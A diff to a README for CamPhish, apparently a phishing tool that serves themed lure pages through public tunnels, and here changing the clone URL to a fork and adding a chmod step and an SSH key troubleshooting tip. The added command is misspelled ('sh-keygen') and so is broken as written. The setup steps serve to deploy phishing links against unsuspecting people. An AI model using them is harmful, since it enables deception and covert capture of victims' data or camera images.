@@ -78,12 +78,20 @@ sudo apt-get update && sudo apt-get -y install php ssh wget unzip
 Quick start:
 
 ```bash
-git clone https://github.com/techchipnet/CamPhish
+git clone https://github.com/uzairdeveloper223/CamPhish
 cd CamPhish
+chmod +x *
 bash camphish.sh
 ```
 
 Follow interactive prompts: choose a template, enter festival name (multi-word allowed), choose style, and pick a tunnel (Serveo or localhost.run).
+
+If the link generation for localhost.run fails, try running the commands below:
+
+```bash
+sh-keygen -t rsa -b 4096
+  ```
+  this will create a new SSH key pair in the default location (`~/.ssh/id_rsa` and `~/.ssh/id_rsa.pub`).
 
 ## Testing & verifying template generation
 
